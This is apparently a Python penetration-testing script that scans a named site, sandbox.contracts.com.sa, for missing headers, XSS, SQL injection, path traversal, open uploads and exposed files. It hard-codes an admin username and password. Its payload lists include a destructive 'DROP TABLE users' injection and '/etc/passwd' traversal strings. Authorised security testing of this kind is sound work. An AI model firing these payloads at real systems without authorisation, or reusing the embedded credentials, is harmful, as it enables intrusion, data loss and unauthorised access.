#!/usr/bin/env python3
"""
Comprehensive Security Testing Suite
Target: sandbox.contracts.com.sa
Credentials: azmadmin / P@ssw0rd
"""

import requests
import time
import json
import re
import base64
import threading
import random
import string
from urllib.parse import urljoin, urlparse, quote
from datetime import datetime

class SecurityTestingSuite:
    def __init__(self, target_url, credentials=None):
        self.target_url = target_url.rstrip('/')
        self.credentials = credentials or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.findings = []
        self.test_results = {}
        
    def log_finding(self, test_name, severity, description, evidence="", recommendation=""):
        finding = {
            'timestamp': datetime.now().isoformat(),
            'test': test_name,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'recommendation': recommendation
        }
        self.findings.append(finding)
        print(f"[{severity}] {test_name}: {description}")
        if evidence:
            print(f"    Evidence: {evidence[:150]}...")

    def test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration and security"""
        print("\n=== SSL/TLS SECURITY TESTING ===")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Check if HTTPS is enforced
            http_url = self.target_url.replace('https://', 'http://')
            try:
                http_response = requests.get(http_url, timeout=5, allow_redirects=False)
                if http_response.status_code not in [301, 302, 308]:
                    self.log_finding(
                        "HTTP Not Redirected",
                        "MEDIUM",
                        "HTTP traffic is not automatically redirected to HTTPS",
                        f"HTTP status: {http_response.status_code}",
                        "Implement HTTP to HTTPS redirect"
                    )
            except:
                pass  # HTTP might be blocked, which is good
            
            # Check for HSTS header
            hsts_header = response.headers.get('Strict-Transport-Security')
            if not hsts_header:
                self.log_finding(
                    "Missing HSTS Header",
                    "MEDIUM",
                    "Strict-Transport-Security header is missing",
                    "HSTS not implemented",
                    "Add HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains"
                )
            
        except Exception as e:
            print(f"SSL/TLS testing error: {e}")

    def test_security_headers(self):
        """Comprehensive security headers testing"""
        print("\n=== SECURITY HEADERS ANALYSIS ===")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            # Critical security headers to check
            security_headers = {
                'X-Frame-Options': {
                    'severity': 'HIGH',
                    'purpose': 'Prevent clickjacking attacks',
                    'recommendation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
                },
                'X-Content-Type-Options': {
                    'severity': 'MEDIUM',
                    'purpose': 'Prevent MIME type sniffing',
                    'recommendation': 'Add X-Content-Type-Options: nosniff'
                },
                'Content-Security-Policy': {
                    'severity': 'HIGH',
                    'purpose': 'Prevent XSS and code injection',
                    'recommendation': 'Implement CSP: Content-Security-Policy: default-src \'self\''
                },
                'X-XSS-Protection': {
                    'severity': 'LOW',
                    'purpose': 'Enable XSS filtering in browsers',
                    'recommendation': 'Add X-XSS-Protection: 1; mode=block'
                },
                'Referrer-Policy': {
                    'severity': 'LOW',
                    'purpose': 'Control referrer information',
                    'recommendation': 'Add Referrer-Policy: strict-origin-when-cross-origin'
                },
                'Permissions-Policy': {
                    'severity': 'LOW',
                    'purpose': 'Control browser features',
                    'recommendation': 'Add Permissions-Policy to control feature access'
                }
            }
            
            for header, info in security_headers.items():
                if header not in headers:
                    self.log_finding(
                        f"Missing {header}",
                        info['severity'],
                        f"Security header {header} is missing - {info['purpose']}",
                        f"Header not found in response",
                        info['recommendation']
                    )
            
            # Check for information disclosure in headers
            server_header = headers.get('Server', '')
            if server_header:
                self.log_finding(
                    "Server Information Disclosure",
                    "LOW",
                    "Server version information disclosed in headers",
                    f"Server: {server_header}",
                    "Remove or mask server version information"
                )
                
        except Exception as e:
            print(f"Security headers testing error: {e}")

    def test_authentication_mechanisms(self):
        """Test authentication security"""
        print("\n=== AUTHENTICATION TESTING ===")
        
        try:
            # Test login endpoint
            login_url = urljoin(self.target_url, '/login')
            login_response = self.session.get(login_url, timeout=10)
            
            if login_response.status_code == 200:
                # Check for CSRF protection
                csrf_patterns = [
                    r'csrf[_-]?token',
                    r'_token',
                    r'authenticity[_-]?token'
                ]
                
                has_csrf = any(re.search(pattern, login_response.text, re.IGNORECASE) 
                              for pattern in csrf_patterns)
                
                if not has_csrf:
                    self.log_finding(
                        "Missing CSRF Protection",
                        "MEDIUM",
                        "Login form appears to lack CSRF protection",
                        "No CSRF tokens found in login form",
                        "Implement CSRF tokens in all forms"
                    )
                
                # Test with provided credentials
                if self.credentials:
                    self._test_login_functionality()
                    
        except Exception as e:
            print(f"Authentication testing error: {e}")

    def _test_login_functionality(self):
        """Test login with provided credentials"""
        login_endpoints = [
            '/login',
            '/api/login',
            '/api/auth/login',
            '/signin'
        ]
        
        for endpoint in login_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                
                # Try form-based login
                login_data = {
                    'username': self.credentials.get('username'),
                    'password': self.credentials.get('password'),
                    'email': self.credentials.get('username')  # Some apps use email field
                }
                
                response = self.session.post(url, data=login_data, timeout=10)
                
                # Check for successful login indicators
                if self._check_login_success(response):
                    self.log_finding(
                        "Valid Credentials Confirmed",
                        "INFO",
                        f"Login successful at {endpoint}",
                        f"Status: {response.status_code}",
                        "Credentials are working - proceed with authenticated testing"
                    )
                    self._test_session_security(response)
                    break
                    
            except Exception as e:
                continue

    def _check_login_success(self, response):
        """Check if login was successful"""
        success_indicators = [
            'dashboard', 'welcome', 'profile', 'logout', 'home',
            '"success"', '"authenticated"', 'token'
        ]
        
        # Check for redirect
        if response.status_code in [302, 301]:
            return True
            
        # Check content
        content = response.text.lower()
        return any(indicator in content for indicator in success_indicators)

    def _test_session_security(self, response):
        """Test session management security"""
        print("Testing session security...")
        
        # Check for secure cookie flags
        set_cookie_header = response.headers.get('Set-Cookie', '')
        if set_cookie_header:
            if 'secure' not in set_cookie_header.lower():
                self.log_finding(
                    "Insecure Session Cookie",
                    "MEDIUM",
                    "Session cookie missing Secure flag",
                    "Secure flag not set on cookies",
                    "Add Secure flag to all session cookies"
                )
            
            if 'httponly' not in set_cookie_header.lower():
                self.log_finding(
                    "Session Cookie Accessible via JavaScript",
                    "MEDIUM",
                    "Session cookie missing HttpOnly flag",
                    "HttpOnly flag not set on cookies",
                    "Add HttpOnly flag to prevent XSS cookie theft"
                )

    def test_input_validation(self):
        """Test for input validation vulnerabilities"""
        print("\n=== INPUT VALIDATION TESTING ===")
        
        # XSS Testing
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '\"><script>alert("XSS")</script>',
            'javascript:alert("XSS")'
        ]
        
        test_params = ['q', 'search', 'query', 'name', 'message', 'comment']
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    if payload in response.text:
                        self.log_finding(
                            "Reflected XSS Vulnerability",
                            "HIGH",
                            f"XSS payload reflected in parameter '{param}'",
                            f"Payload: {payload}",
                            "Implement proper input sanitization and output encoding"
                        )
                        break  # One finding per parameter is enough
                        
                except Exception as e:
                    continue

        # SQL Injection Testing
        self._test_sql_injection()

    def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT 1,2,3--"
        ]
        
        test_params = ['id', 'user_id', 'search', 'filter']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for SQL error messages
                    sql_errors = [
                        'sql syntax', 'mysql', 'sqlite', 'postgresql',
                        'ora-', 'sql server', 'odbc', 'jdbc'
                    ]
                    
                    content = response.text.lower()
                    if any(error in content for error in sql_errors):
                        self.log_finding(
                            "SQL Injection Vulnerability",
                            "CRITICAL",
                            f"SQL error detected in parameter '{param}'",
                            f"Payload: {payload}",
                            "Use parameterized queries and input validation"
                        )
                        break
                        
                except Exception as e:
                    continue

    def test_file_upload_security(self):
        """Test file upload functionality"""
        print("\n=== FILE UPLOAD TESTING ===")
        
        upload_endpoints = [
            '/upload',
            '/api/upload',
            '/file/upload',
            '/media/upload'
        ]
        
        for endpoint in upload_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                
                # Test with potentially malicious file
                files = {
                    'file': ('test.php', '<?php echo "TEST"; ?>', 'text/plain')
                }
                
                response = self.session.post(url, files=files, timeout=10)
                
                if response.status_code in [200, 201, 202]:
                    self.log_finding(
                        "File Upload Endpoint Found",
                        "MEDIUM",
                        f"File upload endpoint active at {endpoint}",
                        f"Response: {response.status_code}",
                        "Implement file type validation and security controls"
                    )
                    
            except Exception as e:
                continue

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        print("\n=== DIRECTORY TRAVERSAL TESTING ===")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd'
        ]
        
        test_params = ['file', 'path', 'include', 'view']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    response = self.session.get(
                        self.target_url,
                        params={param: payload},
                        timeout=10
                    )
                    
                    # Check for file content indicators
                    file_indicators = [
                        'root:x:', '/bin/bash', '[fonts]', '[boot loader]'
                    ]
                    
                    content = response.text.lower()
                    if any(indicator in content for indicator in file_indicators):
                        self.log_finding(
                            "Directory Traversal Vulnerability",
                            "CRITICAL",
                            f"File access via parameter '{param}'",
                            f"Payload: {payload}",
                            "Implement proper path validation and access controls"
                        )
                        break
                        
                except Exception as e:
                    continue

    def test_business_logic(self):
        """Test business logic vulnerabilities"""
        print("\n=== BUSINESS LOGIC TESTING ===")
        
        # Test for rate limiting
        try:
            login_url = urljoin(self.target_url, '/login')
            
            # Make multiple rapid requests
            for i in range(10):
                response = self.session.post(
                    login_url,
                    data={'username': 'test', 'password': 'test'},
                    timeout=5
                )
                
                if i == 9:  # After 10 attempts
                    if response.status_code not in [429, 423]:  # Not rate limited
                        self.log_finding(
                            "No Rate Limiting",
                            "MEDIUM",
                            "Login endpoint lacks rate limiting protection",
                            "10 login attempts without rate limiting",
                            "Implement rate limiting and account lockout"
                        )
                        
        except Exception as e:
            pass

    def test_information_disclosure(self):
        """Test for information disclosure"""
        print("\n=== INFORMATION DISCLOSURE TESTING ===")
        
        # Check for sensitive files
        sensitive_paths = [
            '/robots.txt',
            '/sitemap.xml',
            '/.git/',
            '/.env',
            '/web.config',
            '/config.json'
        ]
        
        for path in sensitive_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 0:
                    # Check if it's the default Angular app or actual sensitive content
                    if 'doctype html' not in response.text.lower() or path in ['/robots.txt', '/sitemap.xml']:
                        self.log_finding(
                            "Information Disclosure",
                            "MEDIUM",
                            f"Sensitive file accessible: {path}",
                            f"Status: {response.status_code}, Size: {len(response.text)}",
                            f"Restrict access to {path} or remove if not needed"
                        )
                        
            except Exception as e:
                continue

    def test_api_security(self):
        """Test API security"""
        print("\n=== API SECURITY TESTING ===")
        
        api_endpoints = [
            '/api/',
            '/api/v1/',
            '/api/users',
            '/api/config',
            '/api/admin'
        ]
        
        for endpoint in api_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, timeout=10)
                
                # Check for JSON responses that aren't the Angular app
                if (response.headers.get('content-type', '').startswith('application/json') 
                    or (response.text.strip().startswith('{') and 'angular' not in response.text.lower())):
                    
                    self.log_finding(
                        "API Endpoint Discovery",
                        "INFO",
                        f"API endpoint found: {endpoint}",
                        f"Content-Type: {response.headers.get('content-type')}",
                        "Review API security and authentication requirements"
                    )
                    
            except Exception as e:
                continue

    def generate_security_report(self):
        """Generate comprehensive security testing report"""
        print("\n" + "="*70)
        print("COMPREHENSIVE SECURITY TESTING REPORT")
        print("="*70)
        
        if not self.findings:
            print("No security issues identified during testing.")
            return
        
        # Count findings by severity
        severity_counts = {
            'CRITICAL': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
            'HIGH': len([f for f in self.findings if f['severity'] == 'HIGH']),
            'MEDIUM': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
            'LOW': len([f for f in self.findings if f['severity'] == 'LOW']),
            'INFO': len([f for f in self.findings if f['severity'] == 'INFO'])
        }
        
        print(f"Total Security Findings: {len(self.findings)}")
        print(f"Critical: {severity_counts['CRITICAL']}")
        print(f"High: {severity_counts['HIGH']}")
        print(f"Medium: {severity_counts['MEDIUM']}")
        print(f"Low: {severity_counts['LOW']}")
        print(f"Informational: {severity_counts['INFO']}")
        
        print("\nDETAILED FINDINGS:")
        print("-" * 50)
        
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['test']}")
            print(f"Description: {finding['description']}")
            if finding['evidence']:
                print(f"Evidence: {finding['evidence']}")
            if finding['recommendation']:
                print(f"Recommendation: {finding['recommendation']}")
        
        # Save report to file
        report_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'summary': severity_counts,
            'total_findings': len(self.findings),
            'findings': self.findings
        }
        
        with open('comprehensive_security_test_report.json', 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"\nDetailed report saved to: comprehensive_security_test_report.json")

    def run_comprehensive_testing(self):
        """Execute all security tests"""
        print(f"Starting comprehensive security testing on: {self.target_url}")
        print("="*70)
        
        test_modules = [
            self.test_ssl_tls_configuration,
            self.test_security_headers,
            self.test_authentication_mechanisms,
            self.test_input_validation,
            self.test_file_upload_security,
            self.test_directory_traversal,
            self.test_business_logic,
            self.test_information_disclosure,
            self.test_api_security
        ]
        
        for test_module in test_modules:
            try:
                test_module()
                time.sleep(1)  # Rate limiting between tests
            except Exception as e:
                print(f"Error in {test_module.__name__}: {e}")
        
        self.generate_security_report()

if __name__ == "__main__":
    # Configuration
    TARGET_URL = "https://sandbox.contracts.com.sa"
    CREDENTIALS = {
        "username": "azmadmin",
        "password": "P@ssw0rd"
    }
    
    # Initialize and run security testing
    tester = SecurityTestingSuite(TARGET_URL, CREDENTIALS)
    tester.run_comprehensive_testing()